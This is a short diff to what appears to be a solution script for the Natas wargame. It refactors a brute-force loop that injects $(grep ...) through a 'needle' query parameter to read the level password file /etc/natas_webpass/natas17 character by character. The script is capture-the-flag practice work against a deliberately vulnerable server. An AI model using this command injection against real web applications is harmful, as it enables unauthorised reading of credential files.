@@ -12,6 +12,7 @@ def get_secret(debug=False):
     char_list = string.ascii_letters + string.digits
     password = ""
     req = get_request_object(level_number)
+    url = get_level_url(level_number)
 
     while True:
         if len(password) == password_length:
@@ -22,8 +23,7 @@ def get_secret(debug=False):
                 print(f"checking: {password}{i}")
 
             try:
-                result = req.get(
-                    get_level_url(level_number) + f"?needle=hackers$(grep ^{password}{i} /etc/natas_webpass/natas17)")
+                result = req.get(url + f"?needle=hackers$(grep ^{password}{i} /etc/natas_webpass/natas17)")
             except requests.Timeout:
                 continue
 
